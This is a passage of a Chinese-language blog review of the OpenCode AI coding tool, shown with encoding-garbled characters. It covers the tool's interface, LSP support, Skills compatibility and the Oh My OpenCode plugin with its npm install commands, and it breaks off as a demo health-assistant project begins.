<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7611faf978a4e7a9ade8751184c569b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=G04W1U3Z3S%2Bk69wwdAYVeu6dQhs%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ ä¹‹å‰æœ‰ <strong>Claude Pro/Max è®¢é˜…è´¦å·</strong>ï¼Œå¯ä»¥ç›´æ¥ç™»å½•ä½¿ç”¨ï¼Œæ— ç¼ä» Claude Code è¿ç§»è¿‡æ¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c1276b411d347678e766da0904de1bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=JHZ0NHXe6smU1urdAa2QCu0ISMQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">3ã€å¿«æ·æŒ‡ä»¤</h3>
<p>OpenCode æ”¯æŒæ–œæ å‘½ä»¤ï¼Œè¾“å…¥ <code>/</code>ï¼Œèƒ½çœ‹åˆ°å¾ˆå¤šæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ¨¡å‹åˆ—è¡¨ã€æŸ¥çœ‹ Agentsã€ç®¡ç† MCPã€åˆ‡æ¢ä¸»é¢˜ç­‰ç­‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae940f2d683347a9a08bce17996947b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=d5%2Fa%2FY1w42akHMx5fK08oogqc7c%3D" alt="" loading="lazy"/></p>
<p>æ”¯æŒå‡ åä¸ªä¸åŒçš„ä¸»é¢˜ï¼Œé¢œå€¼éƒ½æŒºé«˜çš„ï¼Œä»è¿™ç‚¹ä¹Ÿèƒ½çœ‹å‡ºæ¥ OpenCode å¾ˆæ³¨é‡ç”¨æˆ·çš„ä½“éªŒï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/867d4f24163840a79c1d166c495d3c22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=C56HkGzibIQ0g3kNfIpPhdg41ss%3D" alt="" loading="lazy"/></p>
<p>è¾“å…¥ <code>@</code> å¯ä»¥å¿«é€Ÿå…³è”ç›®å½•æ–‡ä»¶ï¼Œç»™ AI æ·»åŠ ä¸Šä¸‹æ–‡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fc4f1c4ffb344eaa17acec9c497850a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=edCPxps23pYElWW0UxHqQV6D9p8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">4ã€äº¤äº’ä½“éªŒ</h3>
<p>ç›¸æ¯”äº Claude Codeï¼ŒOpenCode çœŸæ˜¯æŠŠå‘½ä»¤è¡Œçš„äº¤äº’ä½“éªŒæ‹‰æ»¡äº†ï¼Œç”šè‡³æˆ‘è§‰å¾—å®ƒæ˜¯ä¸€ä¸ªä¼ªè£…æˆå‘½ä»¤è¡Œçš„æ¡Œé¢åº”ç”¨ã€‚</p>
<p>ä½ å¯ä»¥ç‚¹å‡»æŸæ¡æ¶ˆæ¯ï¼Œç„¶åä¼šå¼¹å‡ºä¸€ä¸ªæ¶ˆæ¯åŠ¨ä½œæ¡†ï¼Œä½ å¯ä»¥æ’¤å›æ¶ˆæ¯å’Œ AI çš„å›å¤ï¼Œä¹Ÿå¯ä»¥å¤åˆ¶ã€æˆ–è€…åŸºäºå½“å‰å¯¹è¯æ–°å¼€ä¸€ä¸ªå¯¹è¯æ¡†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4271881339e74ac881c7ce1f81c55e61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=QrhtU%2FSSAMJH8o8Ev%2B3B%2BmyefCw%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯ä»¥é€šè¿‡é¼ æ ‡ä¸Šä¸‹æ»šåŠ¨æ¥åˆ‡æ¢é€‰å•ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥é€šè¿‡é¼ æ ‡ç‚¹å‡»è¿›å…¥ä¸‹ä¸€æ­¥ã€‚</p>
<p>ä½ å¯ä»¥æŒ‰ <code>Ctrl + p</code> é”®æ‰“å¼€å‘½ä»¤é¢æ¿ï¼Œç„¶åå¼€å¯ä¾§è¾¹æ ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff9bc6aab5f64da3849ca3fd0a0c51e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=3m9Fol1kC1xu8rlLtlZerIvFFuU%3D" alt="" loading="lazy"/></p>
<p>ç„¶åç•Œé¢å°±å˜æˆäº†è¿™æ ·ï¼Œä½ ç®¡è¿™å«å‘½ä»¤è¡Œï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a05218edec47480395128e249a32d3a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=m7OywrzcgPvL2a4pGBwEVjjCgTI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">5ã€LSP æ”¯æŒ</h3>
<p>ç»†å¿ƒçš„ä½ ä¸€å®šçœ‹åˆ°äº†ï¼Œå³è¾¹çš„ä¾§è¾¹æ æœ‰ä¸ª <code>LSP</code>ï¼Œè¿™æ˜¯ä»€ä¹ˆé¬¼ä¸œè¥¿ï¼Ÿè€è‰²æ‰¹ï¼Ÿ</p>
<p>LSPï¼ˆLanguage Server Protocol è¯­è¨€æœåŠ¡å™¨åè®®ï¼‰æ˜¯å¾®è½¯å¼€å‘çš„ä¸€ç§é€šä¿¡åè®®ï¼Œç”¨äºè®©ä»£ç ç¼–è¾‘å™¨å’Œè¯­è¨€æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œ<strong>LSP å°±æ˜¯è®©ç¼–è¾‘å™¨çœ‹æ‡‚ä»£ç çš„æŠ€æœ¯ã€‚</strong></p>
<p>æ¯”å¦‚ä½ åœ¨ VS Code é‡Œå†™ä»£ç ï¼Œè¾“å…¥ <code>console.</code> å®ƒä¼šè‡ªåŠ¨æç¤º <code>log</code>ã€ç‚¹å‡»å‡½æ•°åèƒ½è·³è½¬åˆ°ä»£ç å®šä¹‰ã€å†™é”™ä»£ç ä¼šç”»çº¢çº¿æé†’ã€‚è¿™äº›ä»£ç ç¼–è¾‘å™¨çš„åŠŸèƒ½ï¼ŒèƒŒåéƒ½æ˜¯ LSP åœ¨å¹²æ´»ã€‚</p>
<p>OpenCode æ”¯æŒ LSPï¼Œæ„å‘³ç€ AI èƒ½çœŸæ­£ç†è§£ä½ çš„ä»£ç ç»“æ„ï¼Œè€Œä¸æ˜¯æŠŠä»£ç å½“æ™®é€šæ–‡å­—ççŒœï¼Œæ”¹èµ·æ¥æ›´ç²¾å‡†ã€‚</p>
<p>æ¯”å¦‚æˆ‘è®© AI ä»‹ç»æˆ‘çš„ AI ç­”é¢˜å¹³å°é¡¹ç›®ä¸­æœ€æœ‰ä»·å€¼çš„ä»£ç ï¼ŒLSP å°±æ´¾ä¸Šç”¨åœºäº†ã€‚å®ƒèƒ½å¸® AI å¿«é€Ÿå®šä½æŸæ®µä»£ç åœ¨å“ªé‡Œè¢«è°ƒç”¨ã€å¼•ç”¨äº†å“ªäº›å˜é‡ï¼Œè€Œä¸æ˜¯è®© AI å‚»å‚»åœ°å…¨å±€æœç´¢æ–‡æœ¬ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf7ecb4153f342318463809a5197017d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=WkF%2FfnBOV9Hw88LZVyHjWX3yQ7A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">6ã€å›åˆ°ä¹‹å‰çš„ä¼šè¯</h3>
<p>å¦‚æœä½ ä¸å°å¿ƒå…³é—­äº† OpenCodeï¼Œä¸ç”¨æ‹…å¿ƒï¼Œå¯ä»¥æ‰“å¼€å‘½ä»¤é¢æ¿ï¼Œé€‰ä¸­ â€œSwitch sessionâ€ åˆ‡æ¢ä¼šè¯ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd649bb4c7f4b0fb2560ff35741fdfb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=aUgK4CZHieBA%2B%2BHK%2BYUGuxzwm0I%3D" alt="" loading="lazy"/></p>
<p>å°±èƒ½å›åˆ°ä¹‹å‰çš„èŠå¤©äº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/110c3446d62a44f180875f33218a8cda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=JylSUq3M4klM1yUXCL18DcUGHGw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">æ¡Œé¢ç‰ˆ OpenCode</h2>
<p>å³ä½¿ OpenCode æ”¯æŒäº†è¿™ä¹ˆå¤šæ”¹è¿›ç”¨æˆ·ä½“éªŒçš„äº¤äº’ï¼Œä½†æˆ‘ä¼°è®¡å¤§å¤šæ•°åŒå­¦è¿˜æ˜¯ä¸å–œæ¬¢å°é»‘æ¡†çš„ã€‚</p>
<p>æ²¡å…³ç³»ï¼ŒOpenCode è¿˜æä¾›äº†æ¡Œé¢åº”ç”¨ç‰ˆæœ¬ï¼macOSã€Windowsã€Linux å…¨ç«¯æ”¯æŒï¼Œè¿™æ˜¯çœŸçš„è¦å·æ­» Claude Code çš„èŠ‚å¥å•Šâ€¦â€¦</p>
<blockquote>
<p>æŒ‡è·¯ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2Fdownload" target="_blank" title="https://opencode.ai/download" ref="nofollow noopener noreferrer">opencode.ai/download</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb874b0d624c460581dd148684d7f879~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=ShlFZyzGYfmLCdvv0jkelv1%2FJDI%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡å½“æˆ‘æ€€ç€æ»¡è…”çƒ­è¡€å®‰è£…å¹¶æ‰“å¼€å®ƒæ—¶ï¼Œç«Ÿç„¶æŠ¥é”™äº†ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d602bc6c33fb4ed095266f34a3a18c66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=vQ28uo4PtwAg80lWuNz45bj%2Buq8%3D" alt="" loading="lazy"/></p>
<p>ç»è¿‡ä¸€ç•ªæ’æŸ¥ï¼Œå‘ç°åŸæ¥æ˜¯æˆ‘å¼€äº†ä»£ç†ï¼Œå…³é—­ä¹‹åå°±æ­£å¸¸è¿è¡Œäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69c0538e282d4bbf8fced8cbad7c5d05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=wkLXYNTQBiqDULd7KaN%2F1zMWWFA%3D" alt="" loading="lazy"/></p>
<p>ä½†æ˜¯ç”¨æƒ¯äº† Cursorï¼Œè¿™ä¸ªäº¤äº’ä½“éªŒçœŸçš„æœ‰ç‚¹æ•·è¡äº†ï¼Œä¸æ¨èå¤§å®¶ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-9">OpenCode æ‰©å±•èƒ½åŠ›</h2>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘è§‰å¾— OpenCode åœ¨å‰ç«¯ç”¨æˆ·ä½“éªŒä¸Šå…¨æ–¹é¢ç¢¾å‹ Claude Codeï¼Œè€Œä¸” OpenCode å®Œå…¨å…¼å®¹ Claude Code çš„ Skills ç³»ç»Ÿï¼</p>
<p>Skills æ˜¯ä¸€ç§ç»™ AI å‡†å¤‡çš„èƒ½åŠ›æ‰©å±•åŒ…ã€‚ä½ å¯ä»¥æŠŠå®ƒç†è§£æˆç»™æ–°åŒäº‹å‡†å¤‡çš„å·¥ä½œäº¤æ¥æ–‡æ¡£ï¼Œé‡Œé¢åŒ…å«ä»»åŠ¡æ‰§è¡Œæ–¹æ³•ã€å·¥å…·ä½¿ç”¨è¯´æ˜ã€æ¨¡æ¿ç´ æç­‰ã€‚</p>
<p>æ¯”å¦‚ä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª <code>å…¬å¸ä»£ç è§„èŒƒ Skill</code>ï¼ŒæŠŠä»£ç é£æ ¼ã€å‘½åè§„åˆ™ã€æ³¨é‡Šè¦æ±‚ç­‰å†™è¿›å»ã€‚ä¹‹å Claude Code ç”Ÿæˆçš„ä»£ç å°±ä¼šè‡ªåŠ¨éµå¾ªè¿™äº›è§„èŒƒï¼Œä¸ç”¨æ¯æ¬¡éƒ½é‡å¤è¯´æ˜ã€‚</p>
<p>æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼ŒOpenCode ä¼šè‡ªåŠ¨æœç´¢è¿™äº›ä½ç½®çš„ Skillsï¼š</p>
<ul>
<li><code>.opencode/skill/&lt;name&gt;/SKILL.md</code>ï¼ˆé¡¹ç›®ç›®å½•ï¼‰</li>
<li><code>~/.config/opencode/skill/&lt;name&gt;/SKILL.md</code>ï¼ˆç”¨æˆ·ç›®å½•ï¼‰</li>
<li><code>.claude/skills/&lt;name&gt;/SKILL.md</code>ï¼ˆClaude Code å…¼å®¹ï¼‰</li>
<li><code>~/.claude/skills/&lt;name&gt;/SKILL.md</code>ï¼ˆClaude Code å…¼å®¹ï¼‰</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä¹‹å‰ç»™ Claude Code åˆ›å»ºè¿‡è‡ªå®šä¹‰ Skillsï¼Œç›´æ¥æ‹¿è¿‡æ¥å°±èƒ½ç”¨ï¼åˆæ˜¯æ— ç¼è¿ç§»ã€‚</p>
<h2 data-id="heading-10">Oh My OpenCode å¼€æŒ‚æ’ä»¶</h2>
<p>å¦‚æœä½ è§‰å¾— OpenCode è¿˜ä¸å¤Ÿå¼ºï¼Œå¯ä»¥è¯•è¯• <code>Oh My OpenCode</code> è¿™ä¸ªå¼€æºçš„ OpenCode å¢å¼ºæ’ä»¶ï¼Œå·²ç» 1w Star äº†ã€‚</p>
<blockquote>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcode-yeongyu%2Foh-my-opencode" target="_blank" title="https://github.com/code-yeongyu/oh-my-opencode" ref="nofollow noopener noreferrer">github.com/code-yeongyâ€¦</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae06949c4ff749b1a7ade445ad6b6442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=0WU0Fg2iZAGGnmvUN8arjC12xKA%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªæ’ä»¶æœ‰å¤šç‰›ï¼Ÿçœ‹çœ‹ç”¨æˆ·è¯„ä»·ï¼š</p>
<blockquote>
<p>"It made me cancel my Cursor subscription."ï¼ˆå®ƒè®©æˆ‘å–æ¶ˆäº† Cursor è®¢é˜…ï¼‰</p>
<p>"Knocked out 8000 eslint warnings with Oh My Opencode, just in a day"ï¼ˆä¸€å¤©å†…ç”¨å®ƒè§£å†³äº† 8000 ä¸ª eslint è­¦å‘Šï¼‰</p>
</blockquote>
<p>Oh My OpenCode çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯å¼•å…¥äº†ä¸€ä¸ªå« <strong>Sisyphus</strong> çš„æ™ºèƒ½ä½“ç¼–æ’ç³»ç»Ÿã€‚</p>
<p>æˆ‘ç‰¹åœ°å»æœäº†ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>è¥¿è¥¿å¼—æ–¯ï¼ˆSisyphusï¼‰æ˜¯å¤å¸Œè…Šç¥è¯ä¸­ä¸€ä½å› æ¬ºéª—ä¼—ç¥ã€æŒ‘æˆ˜æƒå¨è€Œè¢«è¯¸ç¥æƒ©ç½šçš„å›½ç‹ï¼Œä»–çš„æƒ©ç½šæ˜¯æ°¸æ— æ­¢å¢ƒåœ°å°†ä¸€å—å·¨çŸ³æ¨ä¸Šå±±é¡¶ï¼Œè€ŒçŸ³å¤´ä¸€åˆ°å±±é¡¶ä¾¿ä¼šæ»šè½ï¼Œå¦‚æ­¤å‘¨è€Œå¤å§‹ï¼Œè±¡å¾ç€å¾’åŠ³æ— åŠŸã€æ°¸æ— ä¼‘æ­¢çš„ä»»åŠ¡ï¼Œä¹Ÿä»£è¡¨ç€ä¸€ç§å¯¹è’è¯å‘½è¿çš„æŠ—äº‰ç²¾ç¥ã€‚</p>
</blockquote>
<p>è¿™ä¸ªç³»ç»Ÿå¯ä»¥ï¼š</p>
<ol start="0">
<li>å¹¶è¡Œè°ƒåº¦å¤šä¸ª AI æ¨¡å‹ï¼šæ¯”å¦‚è®© GPT debug çš„åŒæ—¶è®© Gemini å†™å‰ç«¯</li>
<li>è‡ªåŠ¨ä»»åŠ¡ç®¡ç†ï¼šä¸å®Œæˆä»»åŠ¡ä¸è®©åœï¼Œåƒè¥¿è¥¿å¼—æ–¯æ¨çŸ³å¤´ä¸€æ ·é”²è€Œä¸èˆ</li>
<li>æ™ºèƒ½ä»£ç å®¡æŸ¥ï¼šè‡ªåŠ¨æ£€æµ‹å¹¶æ¸…ç† AI ç”Ÿæˆçš„å†—ä½™æ³¨é‡Š</li>
<li>LSP æ·±åº¦é›†æˆï¼šæä¾›é‡å‘½åã€è·³è½¬å®šä¹‰ç­‰ IDE çº§åŠŸèƒ½</li>
</ol>
<p>ç®€å•æ¥è¯´ï¼ŒSisyphus å°±æ˜¯ä¸€ä¸ª AI ç›‘å·¥ï¼Œå®ƒèƒ½åŒæ—¶æŒ‡æŒ¥å¤šä¸ª AI æ¨¡å‹å¹²æ´»ï¼Œè¿˜ä¼šç›¯ç€å®ƒä»¬æŠŠä»»åŠ¡åšå®Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6d40801252a4dc7a8d84ace4f0ed64b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=Wu3SU9sApN4vgvINFQHCh6EQfsY%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶å®˜æ–¹è¯´ç”¨ä¸€è¡Œå‘½ä»¤å°±èƒ½å®Œæˆå®‰è£…ï¼Œä½†æˆ‘å»ºè®®ä½ å…ˆå®‰è£… bunï¼Œå†æ‰§è¡Œ npx æ¥å®‰è£…ï¼Œå¦åˆ™å¯èƒ½ä¼šæŠ¥é”™ã€‚</p>
<pre><code class="hljs language-perl" lang="perl">npmÂ install bunÂ -g
npx oh-<span class="hljs-keyword">my</span>-opencode install
</code></pre>
<p>å®‰è£…è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šé—®ä½ æœ‰æ²¡æœ‰æŸäº›æ¨¡å‹çš„è®¢é˜…ï¼Œæˆ‘åæ­£å•¥éƒ½æ²¡æœ‰ï¼Œä¸€ç›´é€‰ "No" å°±è¡Œäº†ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4e02e7a640e4d518270fb4a3bbf579e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=vAw0DxAZapAJHVnx%2BlJgGzOEawQ%3D" alt="" loading="lazy"/></p>
<p>å®‰è£…å®Œæˆåï¼Œå†æ¬¡è¿›å…¥ OpenCodeï¼Œä¹‹ååªéœ€è¦åœ¨ä½ çš„æç¤ºè¯é‡ŒåŠ ä¸Š <code>ultrawork</code>ï¼ˆæˆ– <code>ulw</code>ï¼‰è¿™ä¸ªå¼€æŒ‚å’’è¯­ï¼Œå°±èƒ½æ¿€æ´»å…¨éƒ¨å¢å¼ºåŠŸèƒ½ã€‚è‡ªåŠ¨è°ƒåº¦å¤šä¸ª AI æ¨¡å‹åŒæ—¶å·¥ä½œã€æ·±åº¦æ¢ç´¢ä»£ç åº“ã€é”²è€Œä¸èˆåœ°æ‰§è¡Œã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬è¯•è¯•çœ‹ï¼Œæ­£å¥½æ¥éªŒè¯ä¸€ä¸‹ OpenCode åšé¡¹ç›®çš„èƒ½åŠ›å¦‚ä½•ï¼Ÿèƒ½ä¸èƒ½æŠŠ Claude Code ä¸€è„šè¸¹é£ï¼Ÿ</p>
<h2 data-id="heading-11">å®æˆ˜é¡¹ç›® - ç”¨ OpenCode åšä¸ª AI å¥åº·åŠ©æ‰‹</h2>
<p>æœ€è¿‘èš‚èšé›†å›¢çš„ <code>èš‚èšé˜¿ç¦</code> AI å¥åº·åŠ©æ‰‹ç«äº†ï¼Œåœ°é“å£ã€å…¬å¸æ¥¼ä¸‹çš„ç”µè§†å¹¿å‘Šä¸­éšå¤„å¯è§ä½•ç‚…è€å¸ˆçš„èº«å½±ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a166c234a3244606ae1576460636bc0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=6WwtZA3cGKahe0e7oFxGBnPt%2FA8%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶æˆ‘è¿˜æ²¡æœ‰ç”¨è¿‡å®ƒï¼Œä½†æ˜¯å¬è¯´å®ƒå¯ä»¥é€šè¿‡æ‹çš®è‚¤ã€æ‹æŠ¥å‘Šæä¾› AI åˆè¯Šï¼Œè¿˜èƒ½æ™ºèƒ½å›ç­”åŒ»å­¦ç§‘æ™®å’Œæ²»ç–—å»ºè®®ã€‚</p>
<p>é‚£æˆ‘ä»¬ä¹Ÿæ¥åšä¸ªç±»ä¼¼çš„å¥åº·å°åŠ©æ‰‹ç½‘ç«™å§ï¼</p>
<p>å‰æœ‰èš‚èšé˜¿ç¦ï¼Œä»Šæœ‰é±¼çš®é˜¿å¤ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75da6f5998e142f8abe3a1e3972e0262~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=wS0ppDpqCjsWFLNqHncJVqf7FeE%3D" alt="" loading="lazy"/></p>
<p>å…ˆåˆ†æä¸€ä¸‹ï¼Œæˆ‘ä»¬è¦åšçš„æ˜¯åŒ…å«å‰ç«¯ + åç«¯çš„å…¨æ ˆé¡¹ç›®ï¼Œè€Œä¸”åç«¯è¿˜éœ€è¦è°ƒç”¨ AI å¤§æ¨¡å‹æ¥ç”Ÿæˆå†…å®¹ã€‚</p>
<p>è¿™é‡Œæˆ‘é€‰æ‹©ç”¨ <strong>Vercel AI Gateway</strong> æ¥å®ç° AI èƒ½åŠ›ï¼Œè¿™æ˜¯ä¸€æ¬¾ç®€å•æ˜“ç”¨çš„ AI ç½‘å…³ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/359fb06928d04340b63f4fd1a7fb37cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=bdGvFNRUnHg%2Bt8lYCEHeYw5SxZI%3D" alt="" loading="lazy"/></p>
<p>ä»€ä¹ˆæ˜¯ AI ç½‘å…³ï¼Ÿ</p>
<p>ç®€å•æ¥è¯´ï¼Œå®ƒå°±åƒæ˜¯ç«è½¦ç«™çš„æ£€ç¥¨å£ï¼Œä½ çš„åº”ç”¨å‘æ¥çš„è¯·æ±‚å…ˆç»è¿‡ç½‘å…³ï¼Œç½‘å…³å¸®ä½ å¤„ç†è®¤è¯ã€é™æµã€ç›‘æ§ç­‰ä¸€ç³»åˆ—å¤æ‚çš„æ“ä½œï¼Œç„¶åæŠŠè¯·æ±‚è½¬å‘ç»™ AI å¤§æ¨¡å‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de5d2838f1547fcaf5fd2e543b229c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=%2BWEJLMqz%2BpBXx1SsvQbenWq2Gxc%3D" alt="" loading="lazy"/></p>
<p>è€Œä¸” Vercel AI Gateway æ”¯æŒå¯¹æ¥ 500 å¤šä¸ªå¤§æ¨¡å‹ï¼Œè¿˜æœ‰å…è´¹é¢åº¦ï¼Œéå¸¸é€‚åˆå­¦ä¹ å’Œå°é¡¹ç›®ã€‚</p>
<blockquote>
<p>æŒ‡è·¯ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fvercel.com%2Fai-gateway" target="_blank" title="https://vercel.com/ai-gateway" ref="nofollow noopener noreferrer">vercel.com/ai-gateway</a></p>
</blockquote>
<p>1ï¼‰é¦–å…ˆä½ éœ€è¦æ³¨å†Œç™»å½• Vercelï¼Œç„¶ååœ¨æ§åˆ¶å°åˆ›å»º API Keyï¼Œæ³¨æ„ä¸è¦æ³„éœ²å“¦ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c640a7b070544af7bd0a16f233d7a081~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534227&amp;x-signature=pxjvNU%2FrYiUiXa3Lki12VSMS3Lw%3D" alt="" loading="lazy"/></p>
<p>2ï¼‰å¯åŠ¨ OpenCodeï¼Œåˆ‡æ¢æ¨¡å‹åˆ°ç¼–ç¨‹èƒ½åŠ›å¾ˆå¼ºã€å¹¶ä¸”å…è´¹çš„ GLM-4.7ï¼Œç„¶åè¾“å…¥è¿™æ®µæç¤ºè¯ï¼š</p>
